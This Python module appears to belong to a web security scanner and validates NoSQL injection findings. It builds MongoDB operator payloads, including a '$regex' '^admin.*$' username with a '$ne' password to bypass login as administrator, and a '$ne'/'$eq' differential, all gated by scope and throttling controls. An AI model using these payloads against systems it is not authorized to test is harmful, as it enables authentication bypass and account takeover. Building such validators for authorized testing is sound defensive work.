"""Deterministic NoSQL operator-injection confirmation.

Login forms: the leg uses two fresh pre-auth sessions. A negative-control username
regex that cannot match must remain on the login boundary; an otherwise identical
regex for the declared administrator identity must reach an authenticated
administrator page. Fresh form pages provide session-bound anti-CSRF values for
each attempt.

Any other request (r7: JSON-body POST/PUT findings were skipped unsent, and the
only nosql traffic of the run was a login-form fetch on another endpoint): an
operator differential on the finding's OWN request -- same method, URL, headers
and body, with one parameter at a time replaced. `{"$ne": t}` must behave
differently from `{"$eq": t}`, while `{"$eq": t}` behaves like the plain string
`t`, and both operator responses must repeat. Every send goes through the run's
transport, so the scope, active and mutating-replay gates apply.
"""
from __future__ import annotations

import re
import json
import uuid
from urllib.parse import parse_qsl, urlencode, urljoin, urlsplit, urlunsplit

from harness import global_throttle
from harness.feature_workflow import extract_forms
from harness.models import Finding, HttpExchange
from .base import ValidationResult, Validator
from .injection_targets import (
    PARTIAL_COVERAGE, QUERY, coverage_note, param_targets,
    replay_headers, select_targets, tested_inputs)
from .sqlmap import _content_type_of, _looks_like_json, _mutate_json_param

_MAX_PARAMS = 3
# $ne, $eq and the plain value, then $ne and $eq again: what one confirmation costs.
_SENDS_PER_VERDICT = 5


_USER = re.compile(r"(?:^|[_-])(user(?:name)?|login|email)(?:$|[_-])", re.I)
_PASS = re.compile(r"(?:^|[_-])(pass(?:word)?|pwd)(?:$|[_-])", re.I)
_ADMIN_READBACK = re.compile(
    r"(?:your\s+username\s+is\s*:?\s*</?[^>]*>\s*administrator|"
    r"(?:username|account|user)[^\n]{0,80}\badmin[a-z0-9_-]*\b)", re.I)


def _credential_names(body: str) -> tuple[str, str]:
    raw = (body or "").strip()
    if raw.startswith("{"):
        try:
            obj = json.loads(raw)
            names = list(obj) if isinstance(obj, dict) else []
        except (TypeError, ValueError):
            names = []
    else:
        names = [k for k, _ in parse_qsl(raw, keep_blank_values=True)]
    user = next((k for k in names if _USER.search(k)), "")
    password = next((k for k in names if _PASS.search(k)), "")
    return user, password


def _administrator_readback(final_url: str, body: str) -> bool:
    parts = urlsplit(final_url or "")
    query = dict(parse_qsl(parts.query, keep_blank_values=True))
    return query.get("id", "").lower().startswith("admin") or bool(
        _ADMIN_READBACK.search(body or ""))


def _login_boundary(exchange: HttpExchange) -> bool:
    return ((exchange.method or "GET").upper() == "POST"
            and "login" in (urlsplit(exchange.url or "").path or "").lower()
            and all(_credential_names(exchange.request_body or "")))


def operator_targets(exchange: HttpExchange) -> list[tuple[str, str]]:
    """The inputs the operator differential can carry an operator in: query and
    body parameters, but only query parameters on a GET/HEAD (a body there is not
    the request's input)."""
    targets = param_targets(exchange)
    if (exchange.method or "GET").upper() in ("GET", "HEAD"):
        targets = [t for t in targets if t[0] == QUERY]
    return targets


def _bracket_operator(pairs: list[tuple[str, str]], param: str, op: str | None,
                      value: str) -> list[tuple[str, str]]:
    key = f"{param}[{op}]" if op else param
    return [(key, value) if k == param else (k, v) for k, v in pairs]


def operator_request(exchange: HttpExchange, loc: str, param: str, op: str | None,
                     value: str) -> tuple[str, str] | None:
    """(url, body) with `param` carrying `{op: value}` (or the plain `value` when
    `op` is None): a JSON object in a JSON body, a bracketed key (`p[$ne]=v`) in a
    query or form body. None when the request does not carry `param` there."""
    url, body = exchange.url, exchange.request_body or ""
    if loc == QUERY:
        parts = urlsplit(url)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        if not any(k == param for k, _ in pairs):
            return None
        query = urlencode(_bracket_operator(pairs, param, op, value))
        return urlunsplit((parts.scheme, parts.netloc, parts.path, query, parts.fragment)), body
    if _looks_like_json(body, _content_type_of(exchange)):
        mutated = _mutate_json_param(body, param, {op: value} if op else value)
        return (url, mutated) if mutated is not None else None
    pairs = parse_qsl(body, keep_blank_values=True)
    if not any(k == param for k, _ in pairs):
        return None
    return url, urlencode(_bracket_operator(pairs, param, op, value))


def _shape(outcome) -> tuple:
    """A response's comparable shape: its status and a coarse body length (a
    created object's id or timestamp must not read as a behaviour change)."""
    return (outcome.status, len((outcome.body or "").strip()) // 64)


class NosqlValidator(Validator):
    name = "nosql"
    finding_classes = {"nosql", "nosql injection", "mongodb injection"}
    active = True

    def __init__(self, allowed_hosts=None, timeout: float = 10.0, run_context=None):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout
        self.run_context = run_context

    def _result(self, status: str, summary: str, *, confirmed: bool = False,
                confidence: float = 0.0, evidence: str = "") -> ValidationResult:
        return ValidationResult(
            validator=self.name, status=status, finding_class="nosql",
            confidence=confidence, confirmed=confirmed, summary=summary,
            evidence=evidence)

    async def _attempt(self, exchange: HttpExchange, user_name: str,
                       pass_name: str, *, administrator: bool):
        ctx = self.run_context
        if ctx is None:
            return None
        sid = f"nosql-login-{uuid.uuid4().hex[:10]}"
        ctx.sessions.register(sid, sid, allowed_origins=[exchange.url],
                              role="anonymous", name="nosql pre-auth", ephemeral=True)
        transport = ctx.target_transport()
        await global_throttle.acquire()
        page = await transport.send(
            "GET", exchange.url, capability=self.name, session_ref=sid,
            max_redirects=2)
        if not page.ok or page.status != 200:
            return None
        forms = extract_forms(page.body or "", page.final_url or exchange.url)
        form = next((f for f in forms if any(
            (fld.type or "").lower() == "password" or
            _PASS.search(fld.name or "") for fld in f.fields)), None)
        if form is None:
            return None
        values: list[tuple[str, str]] = []
        for field in form.fields:
            name = field.name or ""
            if not name or name in (user_name, pass_name):
                continue
            values.append((name, field.value or ""))
        pattern = "^admin.*$" if administrator else "^harness-no-such-user-[a-f0-9]{24}$"
        ctype = " ".join(str(v) for k, v in (exchange.request_headers or {}).items()
                         if str(k).lower() == "content-type").lower()
        if "application/json" in ctype:
            document = {k: v for k, v in values}
            document[user_name] = {"$regex": pattern}
            document[pass_name] = {"$ne": "harness-impossible-password"}
            body = json.dumps(document, separators=(",", ":"))
            content_type = "application/json"
        else:
            values.extend(((f"{user_name}[$regex]", pattern),
                           (f"{pass_name}[$ne]", "harness-impossible-password")))
            body = urlencode(values)
            content_type = "application/x-www-form-urlencoded"
        await global_throttle.acquire()
        return await transport.send(
            (form.method or "POST").upper(), urljoin(page.final_url or exchange.url, form.action),
            capability=self.name, session_ref=sid,
            headers={"Content-Type": content_type}, body=body, max_redirects=3)

    async def _operator_differential(self, finding: Finding, exchange: HttpExchange,
                                     note: str = "") -> ValidationResult:
        """$ne vs $eq vs plain-string differential on the finding's own request."""
        targets, coverage = select_targets(finding, operator_targets(exchange), _MAX_PARAMS)
        if not targets:
            return self._result("skipped", "the captured request has no query or body "
                                           "parameter to carry a NoSQL operator" + note)
        ctx = self.run_context
        from harness.run_context import TypedRequest
        from .transport import bind_session
        session_ref, headers = bind_session(ctx, replay_headers(exchange))
        method = (exchange.method or "GET").upper()
        finding_id = getattr(finding, "finding_id", "") or ""
        if method not in ("GET", "HEAD") and finding_id:
            # A write is replayed once per probe: refuse up front, unsent, when the
            # per-finding write ceiling cannot pay for one verdict (fail closed).
            try:
                left, used, ceiling = ctx.gate.mutating_headroom(finding_id, self.name)
            except Exception:
                left, used, ceiling = 0, 0, 0
            if left < _SENDS_PER_VERDICT:
                return self._result(
                    "skipped",
                    f"the operator differential replays this {method} {_SENDS_PER_VERDICT} "
                    f"times per parameter; the per-finding write ceiling allows {left} more "
                    f"({used}/{ceiling} used; raise validators.mutating_ceiling_by_check."
                    f"{self.name})" + note)
        token = f"harness-nosql-{uuid.uuid4().hex[:12]}"
        counts = {"sent": 0, "answered": 0}

        async def send(loc, param, op, value):
            built = operator_request(exchange, loc, param, op, value)
            if built is None:
                return None
            url, body = built
            await global_throttle.acquire()
            out = await ctx.target_transport().execute(
                TypedRequest(method, url, headers=headers, body=body or None),
                capability=self.name, session_ref=session_ref,
                case_ref=getattr(finding, "finding_id", "") or "", max_redirects=0)
            counts["sent"] += 1 if out.executed else 0
            if not out.ok or out.status is None:
                return None
            counts["answered"] += 1
            return out

        decided = []  # targets whose probes all answered: a real negative for them
        for loc, param in targets:
            ne = await send(loc, param, "$ne", token)
            eq = await send(loc, param, "$eq", token)
            literal = await send(loc, param, None, token)
            if ne is None or eq is None or literal is None:
                continue  # unanswered or refused: no verdict for this input
            if _shape(ne) == _shape(eq) or _shape(eq) != _shape(literal):
                decided.append((loc, param))
                continue
            ne2 = await send(loc, param, "$ne", token)
            eq2 = await send(loc, param, "$eq", token)
            if ne2 is None or eq2 is None:
                continue
            if _shape(ne2) != _shape(ne) or _shape(eq2) != _shape(eq):
                decided.append((loc, param))  # unstable: not an operator effect
                continue
            where = "query" if loc == QUERY else "body"
            result = self._result(
                "confirmed",
                f"the {where} parameter {param!r} of {method} {exchange.url} evaluates NoSQL "
                f"operators: {{'$ne': t}} answered HTTP {ne.status} ({len(ne.body or '')} "
                f"bytes) twice, while {{'$eq': t}} and the plain string t both answered HTTP "
                f"{eq.status} ({len(eq.body or '')} bytes).",
                confirmed=True, confidence=0.9,
                evidence="Operator differential on the captured request: a non-matching $eq "
                         "and the literal value agree, $ne differs, and both repeat.")
            result.baseline_artifact_id = literal.artifact_id
            result.attack_artifact_id = ne.artifact_id
            result.control_artifact_ids = tuple(a for a in (eq.artifact_id, eq2.artifact_id) if a)
            result.tested_parameters = tested_inputs(finding, [(loc, param)])
            return result
        if not decided:
            # Nothing reached a verdict (refused by the gate, or unanswered): this is
            # not a negative for the finding.
            return self._result(
                "error" if counts["sent"] else "skipped",
                f"no parameter of {method} {exchange.url} got a complete operator "
                f"differential ({counts['sent']} sent, {counts['answered']} answered)" + note)
        if len(decided) < len(targets) and not coverage:
            coverage = PARTIAL_COVERAGE
        result = self._result(
            "not_confirmed",
            f"operator values in {', '.join(p for _, p in decided)} of {method} "
            f"{exchange.url} behaved like plain strings" + note
            + coverage_note(coverage, finding))
        result.control_outcome = coverage
        result.tested_parameters = tested_inputs(finding, decided)
        return result

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        if not self.applies(finding, exchange):
            return self._result("skipped", "finding class is not NoSQL injection")
        if self.run_context is None:
            return self._result("skipped", "run-scoped session transport is required")
        if not _login_boundary(exchange):
            return await self._operator_differential(finding, exchange)
        user_name, pass_name = _credential_names(exchange.request_body or "")

        control = await self._attempt(
            exchange, user_name, pass_name, administrator=False)
        if control is None:
            # No HTML login form behind the URL (an API login): test the captured
            # request itself rather than give up on a page that is not there.
            return await self._operator_differential(
                finding, exchange, note=" (no login form page was available)")
        if not control.ok:
            return self._result("error", "negative-control login request failed to execute")
        if _administrator_readback(control.final_url, control.body or ""):
            return self._result("not_confirmed", "negative control unexpectedly reached an administrator page")

        probe = await self._attempt(
            exchange, user_name, pass_name, administrator=True)
        if probe is None or not probe.ok:
            return self._result("error", "administrator operator probe failed to execute")
        if probe.status == 200 and _administrator_readback(probe.final_url, probe.body or ""):
            return self._result(
                "confirmed",
                "MongoDB operator-shaped credentials bypassed authentication and an independent account page read back the administrator identity.",
                confirmed=True, confidence=0.95,
                evidence="Non-matching regex control stayed unauthenticated; ^admin.*$ plus a password inequality reached an authenticated administrator page.")
        return self._result("not_confirmed", "operator-shaped login did not reach an administrator account page")
